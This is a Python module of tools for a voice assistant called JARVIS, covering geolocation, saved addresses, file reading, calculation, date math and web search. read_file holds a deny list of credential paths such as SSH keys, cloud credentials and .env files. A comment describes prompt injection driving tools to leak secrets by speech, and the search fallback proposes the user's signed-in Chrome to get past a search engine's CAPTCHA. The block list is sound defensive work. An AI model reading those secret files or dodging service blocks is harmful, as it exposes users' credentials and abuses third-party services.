    body = _json.dumps({"considerIp": True, "wifiAccessPoints": aps})
    url = f"https://www.googleapis.com/geolocation/v1/geolocate?key={api_key}"
    try:
        proc = await asyncio.create_subprocess_exec(
            "curl", "-sS", "-m", "5", "-X", "POST",
            "-H", "Content-Type: application/json",
            "-d", body, url,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        out_b, _ = await asyncio.wait_for(proc.communicate(), timeout=6.0)
        data = _json.loads(out_b.decode("utf-8", errors="replace"))
    except Exception as e:
        logger.debug(f"[current_location] Google geolocate failed: {e}")
        return None
    if "error" in data:
        # 403 = API not enabled on the user's GCP project — distinct
        # from "key is invalid" (that returns a different shape). The
        # warning text below avoids the previously-misleading "key
        # missing" phrasing — Ulrich's key was valid; only the project
        # didn't have the Geolocation/Geocoding APIs activated. Extract
        # the project id from the error so the operator can jump
        # straight to the right enablement URL.
        err = data["error"]
        msg = err.get("message", "")
        project = ""
        for detail in err.get("details", []) or []:
            metadata = detail.get("metadata") or {}
            consumer = metadata.get("consumer", "")
            if consumer:
                project = consumer.replace("projects/", "")
                break
        if "PERMISSION_DENIED" in msg or "has not been used" in msg or "blocked" in msg.lower():
            logger.warning(
                "[current_location] Google Geolocation API not enabled "
                "on project=%s (key itself is valid — falling through "
                "to IP geo). Enable at "
                "console.cloud.google.com/apis/library/"
                "geolocation.googleapis.com?project=%s and "
                ".../geocoding-backend.googleapis.com?project=%s",
                project or "<unknown>", project, project,
            )
        else:
            logger.debug(f"[current_location] Google geo error: {msg[:120]}")
        return None
    loc = data.get("location") or {}
    if "lat" in loc and "lng" in loc:
        accuracy = data.get("accuracy")
        try:
            accuracy_m = float(accuracy) if accuracy is not None else None
        except (TypeError, ValueError):
            accuracy_m = None
        return (float(loc["lat"]), float(loc["lng"]), accuracy_m)
    return None


async def _reverse_geocode(
    lat: float, lng: float, precision: str
) -> str | None:
    """Coords → human-readable string, **clipped to the precision band**.

    Critical: the caller passes the precision band derived from the
    geolocation accuracy. We MUST NOT emit a road or neighborhood when
    precision is city/region/country, even if Nominatim returns one —
    the closest road to a city-level coordinate is meaningless and
    invites confabulation downstream (e.g. the 2026-05-17 "Parsons
    Avenue" failure where the supervisor extended an IP-geo "Columbus,
    Ohio" answer into a fake street).

    Returns a comma-joined string capped at the precision band, or None
    on lookup failure.
    """
    import json as _json
    # zoom=18 still gets the rich address dict back; we just choose
    # what to keep based on `precision`.
    url = (
        f"https://nominatim.openstreetmap.org/reverse"
        f"?format=json&lat={lat}&lon={lng}&zoom=18"
    )
    try:
        proc = await asyncio.create_subprocess_exec(
            "curl", "-sS", "-m", "5",
            "-H", "User-Agent: jarvis-agent/1.0",
            url,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        out_b, _ = await asyncio.wait_for(proc.communicate(), timeout=6.0)
        data = _json.loads(out_b.decode("utf-8", errors="replace"))
    except Exception as e:
        logger.debug(f"[current_location] reverse-geocode failed: {e}")
        return None
    addr = data.get("address") or {}
    road = addr.get("road")
    neighbourhood = (
        addr.get("neighbourhood") or addr.get("suburb") or addr.get("quarter")
    )
    city = (
        addr.get("city") or addr.get("town") or addr.get("village")
        or addr.get("hamlet") or addr.get("county")
    )
    region = addr.get("state") or addr.get("region")
    country = addr.get("country")

    # Precision ceiling — strip detail that the source signal can't
    # actually justify.
    if precision == _PRECISION_COUNTRY:
        parts = [country]
    elif precision == _PRECISION_REGION:
        parts = [region, country]
    elif precision == _PRECISION_CITY:
        parts = [city, region, country]
    elif precision == _PRECISION_BLOCK:
        parts = [neighbourhood, city, region, country]
    else:  # _PRECISION_STREET
        parts = [road or neighbourhood, city, region, country]
    cleaned = [p for p in parts if p]
    return ", ".join(cleaned) if cleaned else None


@function_tool
async def saved_address() -> str:
    """Return the user's declared home/work/whatever address.

    Use this for "what's my address" / "where do I live" / "what's my
    home address" / anything where the user means a SPECIFIC place
    they OWN. This is the canonical answer — read from a file the
    user set via `set_saved_address`.

    Returns either the saved value verbatim, or a clear "unset" string
    when no address has been saved. **The LLM must NOT guess on unset
    — ask the user, then call set_saved_address to store the answer.**

    Distinct from `current_location()` which does live IP/Wi-Fi
    positioning — that returns an approximate city, not an address.
    No geolocation API will ever give you the user's apartment number.
    """
    try:
        if _SAVED_ADDRESS_PATH.exists():
            value = _SAVED_ADDRESS_PATH.read_text(encoding="utf-8").strip()
            if value:
                return f"Saved address: {value} (set by user)."
    except Exception as e:
        logger.debug(f"[saved_address] read failed: {e}")
    return (
        "No saved address. Ask the user where they live or what "
        "address to use, then call set_saved_address(address) to "
        "store it. Do NOT guess. Do NOT voice an IP-geo result as "
        "an address — that's current_location's job and it's only "
        "city-accurate at best."
    )


@function_tool
async def set_saved_address(address: str) -> str:
    """Persist the user's declared address.

    Call when the user says something like "remember my address is X" /
    "save my location as X" / "set my address to X" / "for weather use
    Y". Writes verbatim to `~/.jarvis/saved-address` so future
    `saved_address()` calls return it directly.

    Args:
        address: Free-form address string (e.g. "Douala, Cameroon",
              "1234 Main St, Cleveland, Ohio, US", "Tokyo"). Stored
              verbatim. Pass an empty string to clear.
    """
    address = (address or "").strip()
    try:
        _SAVED_ADDRESS_PATH.parent.mkdir(parents=True, exist_ok=True)
        if not address:
            if _SAVED_ADDRESS_PATH.exists():
                _SAVED_ADDRESS_PATH.unlink()
            return "Saved address cleared."
        _SAVED_ADDRESS_PATH.write_text(address + "\n", encoding="utf-8")
        return f"Got it — saved your address as: {address}."
    except Exception as e:
        return f"Could not save address [{type(e).__name__}]. Tell the user briefly."


@function_tool
async def current_location() -> str:
    """Return the device's approximate live location.

    Use for "where am I (right now)" / "what city am I in" / "weather
    here" (chain into weather subagent) / "find pharmacies near me" /
    time-zone lookups / anything that needs APPROXIMATE positioning.

    **This is NEVER the user's address.** A laptop with no GPS gets
    coordinates from Wi-Fi or IP signals — those give a city or
    neighborhood at best. For the user's actual home/work address,
    call `saved_address()` instead.

    Returns a string with an embedded precision marker:

        "Columbus, Ohio, US (precision=city; source=ip-geolocation).
         Cannot resolve a street address from this signal; for the
         user's home/work address, call saved_address."

    **CRITICAL — THE PRECISION RULE.** The string contains
    `precision=<level>` ∈ {country, region, city, block, street}.
    NEVER voice location detail finer than the precision allows:
      precision=city   → city + region + country (NO STREET)
      precision=block  → neighborhood + city OK
      precision=street → road name OK

    On total failure returns "Location unavailable". Then ask the
    user; offer set_saved_address if they want a permanent pin.

    Lookup order (most accurate first):
      1. ~10-min in-memory cache from a prior call (same precision).
      2. Google Geolocation API (Wi-Fi BSSID → coords → reverse geocode,
         clipped to precision band) when GOOGLE_API_KEY is set AND
         the API is enabled on the project.
      3. ipinfo.io / ip-api.com IP-based geo (city-level, VPN-fragile).
    """
    now = time.monotonic()

    # 1. Cache (only for the live-lookup path; saved_address has no cache).
    cached = _CURRENT_LOCATION_CACHE["value"]
    if cached and (now - float(_CURRENT_LOCATION_CACHE["ts"])) < _CURRENT_LOCATION_TTL_S:
        return str(cached)

    # 2. Wi-Fi BSSID + Google Geolocation API (direct curl; needs the
    #    Geolocation API enabled on the user's GCP project).
    google_key = os.environ.get("GOOGLE_API_KEY", "")
    if google_key:
        aps = await _collect_wifi_bssids()
        if aps:
            fix = await _google_geolocate(google_key, aps)
            if fix:
                lat, lng, accuracy_m = fix
                precision = _precision_from_accuracy_m(accuracy_m)
                location = await _reverse_geocode(lat, lng, precision)
                if location:
                    acc_str = (
                        f"~{int(accuracy_m)}m" if accuracy_m is not None
                        else "unknown"
                    )
                    formatted = (
                        f"{location} (precision={precision}; "
                        f"accuracy={acc_str}; source=google-wifi). "
                        f"For the user's home/work address use saved_address."
                    )
                    logger.info(
                        f"[current_location] Google/Wi-Fi → {location} "
                        f"(precision={precision}, accuracy_m={accuracy_m})"
                    )
                    _CURRENT_LOCATION_CACHE["value"] = formatted
                    _CURRENT_LOCATION_CACHE["ts"] = now
                    return formatted

    # 3. IP geolocation. Two providers: ipinfo.io faster but rate-limited,
    # ip-api.com is the no-auth fallback. Both are city-level by physics
    # — never claim block/street precision from this path.
    async def _try(url: str, parse) -> str | None:
        try:
            proc = await asyncio.create_subprocess_exec(
                "curl", "-sS", "-m", "4", url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            out_b, _ = await asyncio.wait_for(proc.communicate(), timeout=5.0)
            import json as _json
            data = _json.loads(out_b.decode("utf-8", errors="replace"))
            return parse(data)
        except Exception as e:
            logger.debug(f"[current_location] {url} failed: {e}")
            return None

    def _parse_ipinfo(d: dict) -> str | None:
        city = d.get("city")
        region = d.get("region")
        country = d.get("country")
        parts = [p for p in (city, region, country) if p]
        return ", ".join(parts) if parts else None

    def _parse_ipapi(d: dict) -> str | None:
        city = d.get("city")
        region = d.get("regionName")
        country = d.get("country")
        parts = [p for p in (city, region, country) if p]
        return ", ".join(parts) if parts else None

    ip_location = await _try("https://ipinfo.io/json", _parse_ipinfo)
    if not ip_location:
        ip_location = await _try("http://ip-api.com/json/", _parse_ipapi)

    if ip_location:
        formatted = (
            f"{ip_location} (precision=city; source=ip-geolocation). "
            f"Cannot resolve a street address from this signal; for the "
            f"user's home/work address, call saved_address."
        )
        _CURRENT_LOCATION_CACHE["value"] = formatted
        _CURRENT_LOCATION_CACHE["ts"] = now
        return formatted
    return (
        "Location unavailable. Tell the user briefly and ask them which "
        "city/address to use; offer set_saved_address for a permanent pin."
    )


# Path fragments that identify credential-bearing files. read_file
# refuses these even though the bash tool technically could reach them:
# JARVIS's threat model (CLAUDE.md) acknowledges mic / prompt-injection
# can drive tools, and read_file → TTS is the cheapest secret-exfil path.
_SECRET_PATH_FRAGMENTS = (
    "/.ssh/",
    "/.aws/credentials",
    "/.config/gcloud/",
    "/.netrc",
    "/.pgpass",
    "/.docker/config.json",
    "/.kube/config",
    "id_rsa",
    "id_ed25519",
    "id_ecdsa",
    "local-api-token",
)
_SECRET_PATH_SUFFIXES = (".env", ".pem", ".key", ".p12", ".pfx")


def _is_secret_path(p: Path) -> bool:
    """True if the path looks like it holds credentials/secrets.

    Matches on the resolved path so symlink tricks don't bypass it.
    Conservative by design — a false positive only blocks one read of an
    oddly-named file, which the user can work around explicitly.
    """
    try:
        resolved = str(p.resolve()).lower()
    except Exception:
        resolved = str(p).lower()
    name = p.name.lower()
    if any(frag in resolved for frag in _SECRET_PATH_FRAGMENTS):
        return True
    # Suffix match on the basename (".env", "prod.env", "server.key", …).
    if any(name == suf.lstrip(".") or name.endswith(suf) for suf in _SECRET_PATH_SUFFIXES):
        return True
    return False


@function_tool
async def read_file(path: str, max_bytes: int = 8_192) -> str:
    """Read a file from disk and return its contents (capped).

    Use when the user asks "what's in <file>" / "read me <file>" / "show
    me the contents of <file>". Atomic single-step.

    NEVER use this for editing — there's no write counterpart. For
    multi-file analysis or refactor work, use plan-mode + the file/code
    tools.

    Credential-bearing files (.env, SSH/cloud keys, local-api-token, …)
    are refused for safety — see `_is_secret_path`.

    Args:
        path:      Absolute or ~-prefixed file path.
        max_bytes: Cap the read at this many bytes (default 8 KB).
    """
    path = (path or "").strip()
    if not path:
        return "No path supplied. Ask the user which file to read."
    p = Path(path).expanduser()
    if _is_secret_path(p):
        logger.warning(f"read_file refused secret-bearing path: {p}")
        return (
            "That file holds credentials, so I won't read it aloud. "
            "Tell the user it's blocked for safety."
        )
    if not p.exists():
        return f"File not found at {p}. Tell the user the path doesn't exist and ask for clarification."
    if p.is_dir():
        return f"{p} is a directory, not a file. Suggest listing contents with glob_files instead."
    try:
        with open(p, "rb") as f:
            data = f.read(max(1, int(max_bytes or 8_192)))
        text = data.decode("utf-8", errors="replace")
    except Exception as e:
        return f"File could not be read [{type(e).__name__}]. Tell the user briefly."
    logger.info(f"read_file → {p} ({len(data)} bytes)")
    return _truncate(text)


@function_tool
async def calc(expression: str) -> str:
    """Evaluate a math expression. Use for ANY arithmetic / unit math
    the user asks about — "what's 17 times 23", "fifteen percent of
    eighty", "square root of 144", "log of 1000".

    NEVER use web_fetch for arithmetic — math has a definitive offline
    answer; using a calculator site is slow and can fail.

    Supports: + - * / // % ** parentheses, and these functions:
      sqrt, log, log2, log10, exp, sin, cos, tan, asin, acos, atan,
      abs, round, floor, ceil, min, max, pi, e.

    Examples (input → output):
      "17 * 23"             → "391"
      "15% of 80"           → "12"   (percent shorthand supported)
      "sqrt(144) + 5"       → "17.0"
      "(50 + 25) / 3"       → "25.0"
      "2 ** 10"             → "1024"

    Returns the numeric result as a string, or an explanation if the
    expression is malformed.
    """
    import ast
    import math as _math

    expr = (expression or "").strip()
    if not expr:
        return "No expression supplied. Tell the user briefly."
    if len(expr) > 500:
        # Bound the input so deeply-nested expressions can't exhaust the
        # recursive AST evaluator before it even starts.
        return "That expression is too long to evaluate safely. Ask the user to simplify."

    # Percent-shorthand: "15% of 80" → "(15/100)*80"
    expr = re.sub(r"(\d+(?:\.\d+)?)\s*%\s*of\s+", r"((\1)/100)*", expr, flags=re.IGNORECASE)
    # Bare "%" → "/100" only if at the end of a number with no `of`
    # (handled above); leave standalone "%" as modulo for power users.

    allowed_funcs = {
        "sqrt": _math.sqrt, "log": _math.log, "log2": _math.log2, "log10": _math.log10,
        "exp": _math.exp, "sin": _math.sin, "cos": _math.cos, "tan": _math.tan,
        "asin": _math.asin, "acos": _math.acos, "atan": _math.atan,
        "abs": abs, "round": round, "floor": _math.floor, "ceil": _math.ceil,
        "min": min, "max": max,
    }
    allowed_consts = {"pi": _math.pi, "e": _math.e}

    def _eval(node):
        if isinstance(node, ast.Expression):
            return _eval(node.body)
        if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
            return node.value
        if isinstance(node, ast.Name) and node.id in allowed_consts:
            return allowed_consts[node.id]
        if isinstance(node, ast.UnaryOp) and isinstance(node.op, (ast.UAdd, ast.USub)):
            v = _eval(node.operand)
            return +v if isinstance(node.op, ast.UAdd) else -v
        if isinstance(node, ast.BinOp):
            l, r = _eval(node.left), _eval(node.right)
            op = node.op
            if isinstance(op, ast.Add): return l + r
            if isinstance(op, ast.Sub): return l - r
            if isinstance(op, ast.Mult): return l * r
            if isinstance(op, ast.Div): return l / r
            if isinstance(op, ast.FloorDiv): return l // r
            if isinstance(op, ast.Mod): return l % r
            if isinstance(op, ast.Pow): return l ** r
            raise ValueError(f"unsupported operator: {type(op).__name__}")
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            if node.func.id not in allowed_funcs:
                raise ValueError(f"unknown function: {node.func.id}")
            return allowed_funcs[node.func.id](*[_eval(a) for a in node.args])
        raise ValueError(f"unsupported syntax: {type(node).__name__}")

    try:
        tree = ast.parse(expr, mode="eval")
        result = _eval(tree)
    except ZeroDivisionError:
        return "Cannot divide by zero. Tell the user."
    except RecursionError:
        return "That expression is nested too deeply to evaluate. Ask the user to simplify it."
    except (ValueError, SyntaxError, TypeError) as e:
        return f"That expression could not be evaluated [{type(e).__name__}]. Ask the user to rephrase."

    # Format: integers as integers, floats with up to 6 decimals stripped of trailing zeros.
    if isinstance(result, float) and result.is_integer():
        result = int(result)
    if isinstance(result, float):
        out = f"{result:.6f}".rstrip("0").rstrip(".")
    else:
        out = str(result)
    return f"Result: {out}"


@function_tool
async def date_math(operation: str, date1: str = "", date2: str = "", days: int = 0) -> str:
    """Date arithmetic. Use for "how many days until X", "what day was
    50 days ago", "what's the date 3 weeks from now", "what day of the
    week is YYYY-MM-DD".

    NEVER use web_fetch for date math — `datetime` handles it offline.

    Operations:
      "diff"     — days/weeks between date1 and date2 (both required, ISO YYYY-MM-DD)
      "add"      — date1 + `days` (negative `days` = past)
      "weekday"  — what day of the week is date1
      "today"    — today's date in ISO format

    Date format: ISO YYYY-MM-DD (e.g. "2026-12-25") OR keywords
    "today" / "tomorrow" / "yesterday".

    Examples:
      date_math("diff", "2026-05-04", "2026-12-25") → "235 days (33 weeks, 4 days) between …"
      date_math("add", "today", days=30)            → "30 days from today is 2026-06-03 (Wednesday)"
      date_math("weekday", "2026-12-25")            → "2026-12-25 is a Friday"
      date_math("today")                            → "Today is 2026-05-04 (Monday)"

    Errors return paraphrasable text — surface briefly to the user.
    """
    from datetime import date as _date, timedelta as _td
    op = (operation or "").strip().lower()

    def _parse(s: str) -> _date:
        s = (s or "").strip().lower()
        if s in ("", "today"):
            return _date.today()
        if s == "tomorrow":
            return _date.today() + _td(days=1)
        if s == "yesterday":
            return _date.today() - _td(days=1)
        try:
            return _date.fromisoformat(s)
        except ValueError as e:
            raise ValueError(f"date '{s}' is not ISO YYYY-MM-DD") from e

    try:
        if op == "today":
            t = _date.today()
            return f"Today is {t.isoformat()} ({t.strftime('%A')})."
        if op == "weekday":
            d = _parse(date1)
            return f"{d.isoformat()} is a {d.strftime('%A')}."
        if op == "add":
            d = _parse(date1)
            n = int(days)
            r = d + _td(days=n)
            direction = "from" if n >= 0 else "before"
            return f"{abs(n)} days {direction} {d.isoformat()} is {r.isoformat()} ({r.strftime('%A')})."
        if op == "diff":
            d1, d2 = _parse(date1), _parse(date2)
            delta = (d2 - d1).days
            weeks, leftover = divmod(abs(delta), 7)
            sign = "after" if delta >= 0 else "before"
            return f"{abs(delta)} days ({weeks} weeks, {leftover} days) — {d2.isoformat()} is {sign} {d1.isoformat()}."
        return f"Unknown operation '{op}'. Use one of: diff, add, weekday, today."
    except ValueError as e:
        return f"Date math failed [{e}]. Ask the user to provide ISO dates (YYYY-MM-DD)."


@function_tool
async def current_time(timezone: str = "") -> str:
    """Return the current local time in a given IANA timezone.

    Use this for any "what time is it" / "current time in <place>" /
    "is it morning in <city>" question. NEVER use web_fetch for time —
    timezone data is offline-resolvable via Python's zoneinfo and never
    fails on network.

    `timezone` is an IANA name like "America/New_York", "Europe/Paris",
    "Africa/Douala" (Cameroon), "Asia/Tokyo". Empty string returns the
    user's local time. Common-name fallbacks resolve a few aliases:
    "cameroon" → "Africa/Douala", "uk"/"britain" → "Europe/London",
    "japan" → "Asia/Tokyo", "ny"/"new york" → "America/New_York".
    """
    from datetime import datetime
    from zoneinfo import ZoneInfo, ZoneInfoNotFoundError
    aliases = {
        "cameroon": "Africa/Douala",
        "uk": "Europe/London", "britain": "Europe/London", "england": "Europe/London",
        "japan": "Asia/Tokyo", "tokyo": "Asia/Tokyo",
        "ny": "America/New_York", "new york": "America/New_York", "nyc": "America/New_York",
        "la": "America/Los_Angeles", "los angeles": "America/Los_Angeles",
        "paris": "Europe/Paris", "france": "Europe/Paris",
        "berlin": "Europe/Berlin", "germany": "Europe/Berlin",
        "lagos": "Africa/Lagos", "nigeria": "Africa/Lagos",
        "utc": "UTC", "gmt": "UTC",
    }
    tz_in = (timezone or "").strip()
    if not tz_in:
        now = datetime.now().astimezone()
        return f"Local time: {now.strftime('%H:%M on %A, %B %d, %Y')} ({now.tzname()})."
    tz_name = aliases.get(tz_in.lower(), tz_in)
    try:
        tz = ZoneInfo(tz_name)
    except ZoneInfoNotFoundError:
        return f"Unknown timezone '{tz_in}'. Use an IANA name like 'Africa/Douala' or 'Europe/London'."
    now = datetime.now(tz)
    return f"Time in {tz_name}: {now.strftime('%H:%M on %A, %B %d, %Y')}."


def _ddg_instant_answer(query: str) -> str | None:
    """DDG Instant Answer JSON API — keyless fallback when the HTML
    scrape path hits CAPTCHA. Different endpoint (api.duckduckgo.com),
    not rate-limited the same way.

    Returns a formatted single-source answer string, OR None if no
    useful content (so the caller can fall through to a different
    fallback). Useful for: Wikipedia-backed entities, calculator
    queries, definitions. Not useful for: multi-word ranked queries
    ("kids coding classes pricing"), real-time data, niche entities.

    Synchronous (called via asyncio.to_thread by web_search)."""
    import json as _json
    import urllib.parse as _up
    import urllib.request

    try:
        url = "https://api.duckduckgo.com/?" + _up.urlencode({
            "q": query, "format": "json",
            "no_html": "1", "skip_disambig": "1",
        })
        req = urllib.request.Request(url, headers={"User-Agent": "JARVIS/1.0"})
        with urllib.request.urlopen(req, timeout=8) as resp:
            data = _json.loads(resp.read(64 * 1024).decode("utf-8", errors="replace"))
    except Exception as e:
        logger.debug(f"[ddg-ia] fetch failed: {type(e).__name__}: {e}")
        return None

    # Try fields in descending order of usefulness.
    abstract = (data.get("AbstractText") or data.get("Abstract") or "").strip()
    answer = (data.get("Answer") or "").strip()
    definition = (data.get("Definition") or "").strip()
    heading = (data.get("Heading") or "").strip()
    src = data.get("AbstractSource") or data.get("DefinitionSource") or "DuckDuckGo"
    src_url = data.get("AbstractURL") or data.get("DefinitionURL") or ""

    body = abstract or answer or definition
    if not body:
        # Last-ditch: first related topic. Often noisy but sometimes
        # useful for niche queries.
        topics = data.get("RelatedTopics") or []
        if topics and isinstance(topics[0], dict):
            body = (topics[0].get("Text") or "").strip()
            if body:
                src = "DuckDuckGo (related)"
                src_url = topics[0].get("FirstURL", src_url)

    if not body:
        return None

    parts = []
    if heading:
        parts.append(f"{heading}: {body}")
    else:
        parts.append(body)
    parts.append(f"Source: {src}" + (f" ({src_url})" if src_url else ""))
    parts.append(
        "(Result from DuckDuckGo Instant Answer fallback — the main "
        "search backend is currently rate-limited. For ranked / "
        "multi-source research, suggest transfer_to_browser.)"
    )
    return "\n".join(parts)


@function_tool
async def web_search(query: str, max_results: int = 5) -> str:
    """Search the web and return the top results (title + URL + snippet).

    Use for ANY "search the web for X" / "find me information on X" /
    "what does the internet say about X" — questions where you don't
    already know the URL.

    NEVER use web_fetch for search — guessing a URL fails too often
    (the site might be down, rate-limited, or redesigned). Use this
    tool first; THEN web_fetch one of the returned URLs if you need
    deeper detail. For multi-source research, use transfer_to_planner
    instead — that wraps a full agent loop.

    Returns up to `max_results` (default 5, cap 10) entries formatted as:
        1. <title>
           <url>
           <snippet>

    Errors return paraphrasable text — surface them briefly to the user
    and offer to retry or try a different query.
    """
    import urllib.parse as _up

    q = (query or "").strip()
    if not q:
        return "No search query supplied. Ask the user what to search for."
    n = max(1, min(int(max_results or 5), 10))

    logger.info(f"web_search → {q!r} (n={n})")

    # DuckDuckGo HTML endpoint — keyless, no rate-limit auth, stable
    # for years. Browser UA required (the JARVIS-voice UA gets a 403).
    url = "https://html.duckduckgo.com/html/"
    params = _up.urlencode({"q": q})
    full_url = f"{url}?{params}"
    UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"

    def _fetch_html() -> str:
        req = urllib.request.Request(full_url, headers={
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Language": "en-US,en;q=0.5",
        })
        with urllib.request.urlopen(req, timeout=12) as resp:
            return resp.read(256 * 1024).decode("utf-8", errors="replace")

    try:
        html = await asyncio.to_thread(_fetch_html)
    except urllib.error.HTTPError as e:
        return f"Search service unavailable [status={e.code}]. Tell the user briefly and offer to try again."
    except urllib.error.URLError as e:
        return f"Search service unreachable [{e.reason}]. Tell the user briefly and offer to try again."
    except Exception as e:
        return f"Search failed [{type(e).__name__}]. Tell the user briefly and offer to try again."

    # 2026-05-08: DuckDuckGo started serving anomaly/CAPTCHA challenge
    # pages instead of results when our IP is rate-limited. The anomaly
    # page is consistently ~14 KB and contains 'anomaly-modal' markers
    # (vs. ~30+ KB for real results). When this happens, every search
    # returned 0 results and JARVIS looped on "let me try a different
    # query" up to 10+ times in a row (live: 01:38–01:42 today).
    if "anomaly-modal" in html or 'data-testid="anomaly' in html:
        logger.warning(
            f"[web_search] DDG anomaly/CAPTCHA detected for {q!r} "
            f"(html_size={len(html)}); trying Instant Answer JSON fallback"
        )
        # Fallback A: DDG Instant Answer JSON API. Different endpoint,
        # not rate-limited the same way as the HTML scrape path. Useful
        # for Wikipedia-backed factual queries ("Python", "Eiffel
        # Tower"), calculator/conversion ("2 + 2", "100 USD in EUR"),
        # and definitions. USELESS for ranked search ("kids coding
        # classes pricing") — that's the LLM's signal to escalate to
        # transfer_to_browser per the message below.
        ia = await asyncio.to_thread(_ddg_instant_answer, q)
        if ia:
            logger.info(f"[web_search] Instant Answer fallback returned for {q!r}")
            return ia
        # Fallback B: instruct LLM to escalate to browser subagent.
        return (
            "Search backend (DuckDuckGo) is rate-limiting this IP and "
            "blocked the query with a CAPTCHA. The keyless Instant Answer "
            "fallback also returned nothing for this query. DO NOT retry "
            "with a rephrased query — every variation hits the same block. "
            "Three honest options, in order of preference:\n"
            "  (a) **Escalate to transfer_to_browser** — the browser "
            "      subagent drives the user's real signed-in Chrome via "
            "      the bridge extension, which bypasses server-side rate "
            "      limits. Best for research-style queries. Hand off with "
            "      transfer_to_browser('search Google for <query>').\n"
            "  (b) Answer from your own knowledge with uncertainty marked "
            "      explicitly (\"as of my training data\" / \"I'm not sure\").\n"
            "  (c) Ask the user for a specific URL and use web_fetch on it.\n"
            "Voice path: 'Search is currently blocked by the backend — "
            "want me to have the browser subagent look it up in your Chrome, "
            "or answer from what I know?'"
        )

    # Parse DDG HTML: result anchors look like
    #   <a class="result__a" rel="nofollow" href="//duckduckgo.com/l/?uddg=<encoded>&...">Title</a>
    # followed (a few elements later) by
    #   <a class="result__snippet" ...>Snippet</a>
    anchor_re = re.compile(
        r'<a[^>]+class="result__a"[^>]+href="([^"]+)"[^>]*>(.*?)</a>',
        re.DOTALL | re.IGNORECASE,
    )
    snippet_re = re.compile(
        r'<a[^>]+class="result__snippet"[^>]*>(.*?)</a>',
        re.DOTALL | re.IGNORECASE,
    )
    anchors = anchor_re.findall(html)
    snippets = snippet_re.findall(html)

    def _strip_tags(s: str) -> str:
        s = re.sub(r"<[^>]+>", " ", s)
        s = re.sub(r"&amp;", "&", s)
        s = re.sub(r"&quot;", '"', s)
        s = re.sub(r"&#x27;|&apos;", "'", s)
        s = re.sub(r"&lt;", "<", s)
        s = re.sub(r"&gt;", ">", s)
        s = re.sub(r"&nbsp;", " ", s)
        return re.sub(r"\s+", " ", s).strip()

    def _real_url(redirect: str) -> str:
        # DDG wraps result URLs in /l/?uddg=<encoded>. Decode it.
        try:
            parsed = _up.urlparse(redirect)
            qs = _up.parse_qs(parsed.query)
            if "uddg" in qs:
                return _up.unquote(qs["uddg"][0])
        except Exception:
            pass
        return redirect.lstrip("/")

    results = []
    for i, (href, title_html) in enumerate(anchors[:n]):
        title = _strip_tags(title_html)
        url_real = _real_url(href)
        snippet = _strip_tags(snippets[i]) if i < len(snippets) else ""
        snippet = (snippet[:160] + "…") if len(snippet) > 160 else snippet
        results.append(f"{len(results)+1}. {title}\n   {url_real}\n   {snippet}")

    if not results:
        return f"No search results for {q!r}. Ask the user to rephrase or try a different angle."
    return "\n".join(results)


@function_tool
async def web_fetch(url: str, timeout: int = 15) -> str:
    """GET a URL and return its body as text (HTML stripped to plain).

    Use for atomic "fetch <url> and tell me what it says" asks. For
    structured search-and-summarize across multiple sources, use
    run_jarvis_cli (the CLI has a richer WebFetch + WebSearch pair
    plus the agent loop to compose them).

    Caps response at ~3 KB after stripping. Times out at `timeout` s
    (default 15).
    """
    url = (url or "").strip()
    if not url:
        return "(no url supplied)"
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    timeout = max(1, min(int(timeout or 15), 60))
    logger.info(f"web_fetch → {url}")
    try:
        # Run the blocking urllib call in a thread so it doesn't pin
        # the agent's event loop on slow hosts.
        def _fetch() -> str:
            req = urllib.request.Request(
                url,
                headers={"User-Agent": "JARVIS-voice/1.0"},
            )
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                ct = resp.headers.get("Content-Type", "")
                raw = resp.read(64 * 1024)  # cap network read at 64 KB
                if "text" not in ct and "json" not in ct and "html" not in ct:
                    return f"(non-text content-type: {ct or 'unknown'})"
                return raw.decode("utf-8", errors="replace")
        body = await asyncio.to_thread(_fetch)
    # Errors return paraphrasing-friendly text (no quotable HTTP-speak
    # like "internal server error" — the LLM tends to relay those
    # verbatim, which sounds robotic). Status code is included for the
    # LLM's reasoning but wrapped so it doesn't read aloud cleanly.
    except urllib.error.HTTPError as e:
        return f"The page could not be retrieved — the site is unavailable [status={e.code}]. Tell the user briefly and offer to try a different source."
    except urllib.error.URLError as e:
        return f"The page could not be retrieved — network failure [{e.reason}]. Tell the user briefly and offer to try again."
    except Exception as e:
        return f"The page could not be retrieved — fetch failed [{type(e).__name__}]. Tell the user briefly and offer to try again."
    # Strip HTML to plain-ish text. Not perfect, but good enough for
    # voice-side summarisation.
    body = re.sub(r"<script\b.*?</script>", "", body, flags=re.DOTALL | re.IGNORECASE)
    body = re.sub(r"<style\b.*?</style>", "", body, flags=re.DOTALL | re.IGNORECASE)
    body = re.sub(r"<[^>]+>", " ", body)
    body = re.sub(r"\s+", " ", body).strip()
    return _truncate(body)


@function_tool
async def glob_files(pattern: str, path: str = "~") -> str:
    """List files matching a glob pattern under `path`, recursively.

    Use for atomic "find all <kind> files in <dir>" / "list every X
    file" asks. Returns one path per line, capped at 100 entries.

    NEVER use this to read file contents — chain with read_file when
    you need to see what's inside. For searching INSIDE files (find
    every TODO, where is X used) use grep_files instead.

    Args:
        pattern: e.g. "*.py", "**/*.ts", "src/**/test_*.py".
        path:    Root to search under (default = home).
    """
    pattern = (pattern or "").strip()
    if not pattern:
        return "No pattern supplied. Ask the user what kind of files to list."
    root = Path(path or "~").expanduser()
    if not root.exists():
        return f"Root path {root} does not exist. Tell the user the directory is missing."
    # Iterate the matcher LAZILY with a scan ceiling so a pathological
    # root (e.g. "/") can't walk the entire filesystem. The old
    # `list(root.rglob(...))` materialized every entry before capping,
    # which hung indefinitely on a large/root path with no timeout.
    _SCAN_CEILING = 50_000
    matches: list[str] = []
    scanned = 0
    hit_ceiling = False
    try:
        it = root.rglob(pattern) if "**" not in pattern else root.glob(pattern)
        for m in it:
            scanned += 1
            if scanned > _SCAN_CEILING:
                hit_ceiling = True
                break
            try:
                if m.is_file():
                    matches.append(str(m))
